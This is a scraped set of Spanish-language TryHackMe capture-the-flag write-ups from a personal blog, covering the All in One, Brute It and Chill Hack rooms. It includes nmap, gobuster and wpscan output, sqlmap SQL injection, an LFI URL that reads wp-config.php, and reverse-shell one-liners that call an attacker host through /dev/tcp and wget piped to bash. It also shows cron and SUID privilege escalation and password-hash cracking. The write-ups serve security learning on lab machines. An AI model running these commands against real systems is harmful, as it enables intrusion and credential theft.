recursive=true lxc start sckull lxc exec sckull /bin/sh    What is the value of the root.txt flag?  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ~ # cd /mnt/root/root cd /mnt/root/root /mnt/root/root # ls -lah ls -lah total 32K drwx------ 4 root root 4.0K Dec 20 03:51 . drwxr-xr-x 23 root root 4.0K Dec 18 14:18 .. lrwxrwxrwx 1 root root 9 Dec 18 17:43 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3.0K Apr 9 2018 .bashrc drwxr-x--- 3 root root 4.0K Dec 20 03:51 .config lrwxrwxrwx 1 root root 9 Dec 19 15:15 .mysql-history -\u0026gt; /dev/null -rw------- 1 root root 264 Dec 19 15:19 .mysql_history -rw-r--r-- 1 root root 148 Aug 17 2015 .profile drwx------ 2 root root 4.0K Dec 18 17:57 .ssh -r-------- 1 root root 600 Dec 19 20:18 root.txt /mnt/root/root # cat root.txt cat root.txt THM{FLY[... snip ...]ES} \u0026#34;As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word \u0026#39;HOLO\u0026#39; embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!\u0026#34; /mnt/root/root #   ","description":"Advent of Cyber 2 de TryHackMe contiene una serie de retos orientados al aprendizaje de herramientas y conceptos de seguridad, liberados diariamente durante 25 dias.","id":27,"section":"posts","tags":["web","reversing","networking","scripting","python","blue",""],"title":"TryHackMe - Advent of Cyber 2","uri":"https://sckull.github.io/posts/aoc2020/"},{"content":"  All in One es una maquina de TryHackMe, una vulnerabilidad SQLi y LFI en WordPress nos permitio obtener credenciales las cuales utilizamos en el panel, seguidamente ejecutamos una shell inversa. Finalmente obtuvimos acceso root mediante bash y un script perteneciente a la lista de crontab.\nRoom    Titulo All in One      Descripción This is a fun box where you will get to exploit the system in several ways. Few intended and unintended paths to getting user and root access.   Puntos 160   Dificultad Facil   Maker i7md     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  # Nmap 7.80 scan initiated Thu Dec 10 13:59:17 2020 as: nmap -p- --min-rate 1000 -o allPorts allinone.thm Nmap scan report for allinone.thm (10.10.25.67) Host is up (0.29s latency). Not shown: 65025 closed ports, 507 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http # Nmap done at Thu Dec 10 14:01:50 2020 -- 1 IP address (1 host up) scanned in 152.79 seconds # Nmap 7.80 scan initiated Thu Dec 10 14:03:29 2020 as: nmap -p 21,22,80 -sV -sC -o servicePorts allinone.thm Nmap scan report for allinone.thm (10.10.25.67) Host is up (0.33s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.2.29.162 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA) | 256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA) |_ 256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Dec 10 14:03:47 2020 -- 1 IP address (1 host up) scanned in 17.51 seconds   FTP El ingreso por medio de anonymous (anonymous:anonymous) esta permitido, por lo que utilizamos las \u0026ldquo;credenciales\u0026rdquo; en este servicio, pero no encontramos nada.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  kali@kali:~/thm/allinone$ ftp allinone.thm Connected to allinone.thm. 220 (vsFTPd 3.0.3) Name (allinone.thm:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 115 4096 Oct 06 11:57 . drwxr-xr-x 2 0 115 4096 Oct 06 11:57 .. 226 Directory send OK. ftp\u0026gt; exit 221 Goodbye.   HTTP Encontramos la pagina web de apache en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, donde encontramos una direccion hacia una pagina en wordpress.\n1 2 3 4 5  kali@kali:~/thm/allinone$ gobuster dir -u http://allinone.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) /wordpress (Status: 301)   WPSCAN - WORDPRESS Utilizamos wpscan para poder obtener informacion sobre la version, plugins, temas y posibles usuarios en la pagina de wordpress. Vemos que la version de wordpress es 5.5.1 y dos plugins mail-masta 1.0 y reflex-gallery 3.1.7.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85  [+] XML-RPC seems to be enabled: http://allinone.thm/wordpress/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] http://allinone.thm/wordpress/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://allinone.thm/wordpress/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://allinone.thm/wordpress/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01). | Found By: Rss Generator (Passive Detection) | - http://allinone.thm/wordpress/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.5.1\u0026lt;/generator\u0026gt; | - http://allinone.thm/wordpress/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.5.1\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwenty | Location: http://allinone.thm/wordpress/wp-content/themes/twentytwenty/ | Last Updated: 2020-12-09T00:00:00.000Z | Readme: http://allinone.thm/wordpress/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 1.6 | Style URL: http://allinone.thm/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5 | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.5 (80% confidence) | Found By: Style (Passive Detection) | - http://allinone.thm/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: \u0026#39;Version: 1.5\u0026#39; [i] Plugin(s) Identified: [+] mail-masta | Location: http://allinone.thm/wordpress/wp-content/plugins/mail-masta/ | Latest Version: 1.0 (up to date) | Last Updated: 2014-09-19T07:52:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | Version: 1.0 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://allinone.thm/wordpress/wp-content/plugins/mail-masta/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://allinone.thm/wordpress/wp-content/plugins/mail-masta/readme.txt [+] reflex-gallery | Location: http://allinone.thm/wordpress/wp-content/plugins/reflex-gallery/ | Latest Version: 3.1.7 (up to date) | Last Updated: 2019-05-10T16:05:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | Version: 3.1.7 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://allinone.thm/wordpress/wp-content/plugins/reflex-gallery/readme.txt [i] User(s) Identified: [+] elyana | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://allinone.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)   Los plugins identificados tienen vulnerabilidades las cuales permiten obtener informacion de la base de datos, subir y leer archivos.\n  WordPress Plugin Mail Masta 1.0 - SQL Injection\n  WordPress Plugin Mail Masta 1.0 - Local File Inclusion\n  WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload\n  SQLI - Mail Masta Utilizando SQLMAP logramos obtener las credenciales del usuario elyana de la base de datos de wordpress.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  #sqlmap -u \u0026#34;http://allinone.thm/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1\u0026amp;pl=/var/www/html/wordpress/wp-load.php\u0026#34; -p list_id --dbs available databases [2]: [*] information_schema [*] wordpress Database: wordpress [23 tables] +----------------------------+ | wp_commentmeta | | wp_comments | | wp_links | | wp_masta_campaign | | wp_masta_cronapi | | wp_masta_list | | wp_masta_reports | | wp_masta_responder | | wp_masta_responder_reports | | wp_masta_settings | | wp_masta_subscribers | | wp_masta_support | | wp_options | | wp_postmeta | | wp_posts | | wp_reflex_gallery | | wp_reflex_gallery_images | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | +----------------------------+ Database: wordpress Table: wp_users [1 entry] +------+--------------------------------+------------------------------------+---------------+------------+-------------+--------------+---------------+---------------------+---------------------+ | ID | user_url | user_pass | user_email | user_login | user_status | display_name | user_nicename | user_registered | user_activation_key | +------+--------------------------------+------------------------------------+---------------+------------+-------------+--------------+---------------+---------------------+---------------------+ | 1 | http://192.168.8.110/wordpress | $P$BhwVLVLk5fGRPyoEfmBfVs82bY7fSq1 | none@none.com | elyana | 0 | elyana | elyana | 2020-10-05 19:55:50 | \u0026lt;blank\u0026gt; | +------+--------------------------------+------------------------------------+---------------+------------+-------------+--------------+---------------+---------------------+---------------------+   LFI - Mail Masta Utilizando el \u0026ldquo;proof\u0026rdquo; para Mail Masta logramos leer el archivo wp-config.php en base64, donde vemos las credenciales de la base de datos y configuraciones de wordpress.\n1  http://allinone.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php   WWW-DATA - USER Utilizamos la contraseña y usuario que encontramos en el panel de wordpress donde pudimos obtener acceso y mediante el editor de temas, agregamos una shell inversa al archivo 404.php del tema actual. Con netcat a la escucha logramos obtener una shell con usuario www-data al provocar un error 404.php agregando una letra en la url del unico post.\nRealizamos una pequeña enumeracion en la carpeta donde se encuentra la pagina de wordpress y encontramos un mensaje en una pagina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  bash-4.4$ ls -lah ls -lah total 28K drwxr-xr-x 3 root root 4.0K Oct 5 20:11 . drwxr-xr-x 3 root root 4.0K Oct 5 19:43 .. -rw-r--r-- 1 root root 197 Oct 5 20:11 hackathons -rwxr-xr-x 1 root root 11K Oct 5 19:44 index.html drwxr-xr-x 5 www-data www-data 4.0K Oct 5 19:59 wordpress bash-4.4$ cat hackathons cat hackathons \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Damn how much I hate the smell of \u0026lt;i\u0026gt;Vinegar \u0026lt;/i\u0026gt; :/ !!! \u0026lt;/h1\u0026gt; \u0026lt;!-- Dvc W@iyur@123 --\u0026gt; \u0026lt;!-- KeepGoing --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   PRIVILEGE ESCALATION Hacemos una pequeña enumeracion al archivo /etc/crontab y vemos que existe un cron que ejecuta a cada minuto el archivo /var/backups/script.sh con usuario root, además este archivo es editable por cualquier usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  bash-4.4$ cat /etc/crontab [... snip ...] # m h dom mon dow user\tcommand 17 *\t* * *\troot cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) * * * * * root /var/backups/script.sh bash-4.4$ cat /var/backups/script.sh cat /var/backups/script.sh #!/bin/bash #Just a test script, might use it later to for a cron task bash-4.4$ ls -lah /var/backups/script.sh ls -lah /var/backups/script.sh -rwxrwxrwx 1 root root 73 Oct 7 13:37 /var/backups/script.sh bash-4.4$   Tambien encontramos ejecutables con permisos SUID.\nbash-4.4$ find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah -rwsr-sr-x 1 root root 1.1M Jun 6 2019 /bin/bash -rwsr-xr-x 1 root root 31K Aug 11 2016 /bin/fusermount -rwsr-xr-x 1 root root 43K Sep 16 18:43 /bin/mount -rwsr-xr-x 1 root root 63K Jun 28 2019 /bin/ping -rwsr-xr-x 1 root root 44K Mar 22 2019 /bin/su -rwsr-xr-x 1 root root 27K Sep 16 18:43 /bin/umount -rwsr-sr-x 1 daemon daemon 51K Feb 20 2018 /usr/bin/at -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/chfn -rwsr-xr-x 1 root root 44K Mar 22 2019 /usr/bin/chsh -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/gpasswd -rwsr-sr-x 1 root root 11M Nov 23 2018 /usr/bin/lxc -rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newgidmap -rwsr-xr-x 1 root root 40K Mar 22 2019 /usr/bin/newgrp -rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newuidmap -rwsr-xr-x 1 root root 59K Mar 22 2019 /usr/bin/passwd -rwsr-xr-x 1 root root 22K Mar 27 2019 /usr/bin/pkexec -rwsr-sr-x 1 root root 392K Apr 4 2018 /usr/bin/socat -rwsr-xr-x 1 root root 146K Jan 31 2020 /usr/bin/sudo -rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils -rwsr-xr-- 1 root messagebus 42K Jun 11 18:25 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 14K Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 111K Jul 10 14:00 /usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 99K Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic SUID Ejecutamos bash -p y logramos obtener una shell root y nuestras flags.\nCRON Agregamos un comando al archivo script.sh para ejecutar una shell inversa.\n1  echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; /var/backups/script.sh   Luego, ejecutamos netcat y logramos obtener una shell con usuario root y nuestras flags: user.txt y root.txt.\n","description":"All in One es una maquina de TryHackMe, una vulnerabilidad SQLi y LFI en WordPress nos permitio obtener credenciales las cuales utilizamos en el panel, seguidamente ejecutamos una shell inversa. Finalmente obtuvimos acceso root mediante bash y un script perteneciente a la lista de crontab.","id":28,"section":"posts","tags":["suid","ftp","cron","wordpress","wpscan"],"title":"TryHackMe - All in One","uri":"https://sckull.github.io/posts/allinone/"},{"content":"  Brute It es una maquina de TryHackMe, fuerza bruta y ssh2john nos dio aceso a la maquina. Utilizando GTFOBins y cat obtuvimos nuestra flag root.txt y escalamos privilegios.\nRoom    Titulo Brute It      Descripción Learn how to brute, hash cracking and escalate privileges in this box!   Puntos 730   Dificultad Facil   Maker ReddyyZ     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # Nmap 7.80 scan initiated Wed Dec 9 19:56:37 2020 as: nmap -p- --min-rate 1000 -o allPorts brute.thm Nmap scan report for brute.thm (10.10.192.18) Host is up (0.36s latency). Not shown: 64739 closed ports, 794 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Wed Dec 9 19:59:02 2020 -- 1 IP address (1 host up) scanned in 146.01 seconds # Nmap 7.80 scan initiated Wed Dec 9 19:59:55 2020 as: nmap -p 22,80 -sV -sC -o servicePorts brute.thm Nmap scan report for brute.thm (10.10.192.18) Host is up (0.36s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA) | 256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA) |_ 256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 9 20:00:15 2020 -- 1 IP address (1 host up) scanned in 19.99 seconds   HTTP Encontramos la pagina web de apache en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5  kali@kali:~/thm/bruteit$ gobuster dir -u http://brute.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /admin (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403)   Encontramos un panel de logeo, en el codigo fuente encontramos dos posibles nombres de usuario.\n1 2 3 4 5  \u0026lt;/div\u0026gt; \u0026lt;!-- Hey john, if you do not remember, the username is admin --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   HYDRA Utilizamos hydra con el usuario admin y el wordlist rockyou.txt para lograr encontrar la contraseña para este usuario.\nIngresamos con las credenciales en el panel y logramos ver el contenido: la primera flag y una clave privada RSA encriptada.\nSSH2JOHN Utilizamos ssh2john para obtener el hash y obtener con john la frase en texto plano de la clave privada.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  kali@kali:~/thm/bruteit$ /usr/share/john/ssh2john.py rsa_encripted \u0026gt; rsa_hash kali@kali:~/thm/bruteit$ john --wordlist=/usr/share/wordlists/rockyou.txt rsa_hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status r[ ... snip ... ]l (rsa_encripted) 1g 0:00:00:04 DONE (2020-12-09 20:16) 0.2096g/s 3006Kp/s 3006Kc/s 3006KC/sa6_123..*7¡Vamos! Session completed kali@kali:~/thm/bruteit$   JOHN - USER Utilizando la clave privada y la frase con el usuario en el servicio SSH logramos obtener una shell y nuestra flag user.txt.\n1 2  kali@kali:~/thm/bruteit$ chmod 600 rsa_encripted kali@kali:~/thm/bruteit$ ssh john@brute.thm -i rsa_encripted   PRIVILEGE ESCALATION Realizamos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos \u0026ldquo;root\u0026rdquo; para ejecutar el comando cat. Utilizamos este comando para obtener la flag root.txt.\nGFOBins - cat\n1  FLAG=/root/root.txt; sudo cat \u0026#34;$FLAG\u0026#34;   Utilizamos cat para leer el contenido de /etc/shadow para obtener el hash del usuario root y con john poder obtener la contraseña en texto plano y poder obtener una shell con este usuario.\n1 2 3 4 5 6  john@bruteit:~$ FLAG=/etc/shadow; sudo cat \u0026#34;$FLAG\u0026#34; root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xD[ ... snip ... ]1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7::: daemon:*:18295:0:99999:7::: bin:*:18295:0:99999:7::: [ ... snip ... ] john@bruteit:~$   1 2 3 4 5 6 7 8 9 10 11  kali@kali:~/thm/bruteit$ john --wordlist=/usr/share/wordlists/rockyou.txt root_hash Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status f[ ... snip ... ]l (root) 1g 0:00:00:00 DONE (2020-12-09 20:23) 12.50g/s 3200p/s 3200c/s 3200C/s 123456..freedom Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed kali@kali:~/thm/bruteit$   Shell con usuario root.\n","description":"","id":29,"section":"posts","tags":["steganography","steghide","docker","sudo privesc","ftp"],"title":"TryHackMe - Brute It","uri":"https://sckull.github.io/posts/bruteit/"},{"content":"  Chill Hack es una maquina de TryHackMe, ejecutamos una shell inversa tras enumerar el sitio web. Obtuvimos acceso al siguiente usuario con un script ejecutado con sudo. Un pequeño reto de esteganografia nos permitio realizar nuevamente movimiento lateral. Finalmente escalamos privilegios utilizando docker.\nRoom    Titulo Chill Hack      Descripción This room provides the real world pentesting challenges.   Puntos 60   Dificultad Facil   Maker Anurodh     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  # Nmap 7.80 scan initiated Wed Dec 9 16:52:55 2020 as: nmap -p- --min-rate 1000 -o allPorts chill.thm Nmap scan report for chill.thm (10.10.95.245) Host is up (0.26s latency). Not shown: 63578 closed ports, 1954 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http # Nmap done at Wed Dec 9 16:55:51 2020 -- 1 IP address (1 host up) scanned in 176.21 seconds # Nmap 7.80 scan initiated Wed Dec 9 16:56:28 2020 as: nmap -p 21,22,80 -sV -sC -o servicePorts chill.thm Nmap scan report for chill.thm (10.10.95.245) Host is up (0.26s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 1001 1001 90 Oct 03 04:33 note.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.2.29.162 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA) | 256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA) |_ 256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Game Info Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 9 16:56:45 2020 -- 1 IP address (1 host up) scanned in 16.85 seconds   FTP Ingresamos por el servicio FTP con las \u0026ldquo;credenciales\u0026rdquo; de anonymous (anonymous:anonymous), donde encontramos una \u0026ldquo;nota\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  kali@kali:~/thm/chillhack$ ftp chill.thm Connected to chill.thm. 220 (vsFTPd 3.0.3) Name (chill.thm:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 115 4096 Oct 03 04:33 . drwxr-xr-x 2 0 115 4096 Oct 03 04:33 .. -rw-r--r-- 1 1001 1001 90 Oct 03 04:33 note.txt 226 Directory send OK. ftp\u0026gt; get note.txt local: note.txt remote: note.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for note.txt (90 bytes). 226 Transfer complete. 90 bytes received in 0.00 secs (34.8772 kB/s) ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; exit 221 Goodbye.   1  Anurodh told me that there is some filtering on strings being put in the command -- Apaar   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos. Vemos que existe una pagina no muy comun (/secret).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  kali@kali:~/thm/chillhack$ gobuster dir -u http://chill.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /about.html (Status: 200) /blog.html (Status: 200) /contact.php (Status: 200) /contact.html (Status: 200) /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /news.html (Status: 200) /secret (Status: 301) /server-status (Status: 403) /team.html (Status: 200) kali@kali:~/thm/chillhack$   Al visitar dicha pagina nos muestra un input donde podemos ejecutar comandos, pero algunos comandos estan \u0026ldquo;prohibidos\u0026rdquo; o \u0026ldquo;filtrados\u0026rdquo; como lo dice la nota.\nWWW-DATA Utilizando la pagina para ejecutar comandos, realizamos la ejecucion de una shell inversa, primero creamos un archivo que contenga la ejecucion de la shell, creamos un \u0026ldquo;mini servidor\u0026rdquo; con python (python3 -m http.server 80) y realizamos la ejecucion de nuestra shell con wget.\n1  bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1   wget -qO- http://10.10.10.10/shell.sh|bash Logrando asi obtener una shell con el usuario www-data.\nMYSQL Al realizar una pequeña enumeracion de archivos, encontramos un archivo php que contiene unas credenciales para una base de datos mysql. Asi mismo encontramos en el archivo hacker.php un mensaje Look in the dark! You will find your answer, el cual puede indicar que algo se esconde en algun lugar o archivo(?).\n1 2 3 4 5 6 7 8 9 10  www-data@ubuntu:/var/www/files$ ls -lah ls -lah total 28K drwxr-xr-x 3 root root 4.0K Oct 3 04:40 . drwxr-xr-x 4 root root 4.0K Oct 3 04:01 .. -rw-r--r-- 1 root root 391 Oct 3 04:01 account.php -rw-r--r-- 1 root root 453 Oct 3 04:02 hacker.php drwxr-xr-x 2 root root 4.0K Oct 3 06:30 images -rw-r--r-- 1 root root 1.2K Oct 3 04:02 index.php -rw-r--r-- 1 root root 545 Oct 3 04:07 style.css   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  cat index.php \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php if(isset($_POST[\u0026#39;submit\u0026#39;])) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; ob_start(); session_start(); try { $con = new PDO(\u0026#34;mysql:dbname=webportal;host=localhost\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;[... snip ... ]\u0026#34;); $con-\u0026gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING); } catch(PDOException $e) { exit(\u0026#34;Connection failed 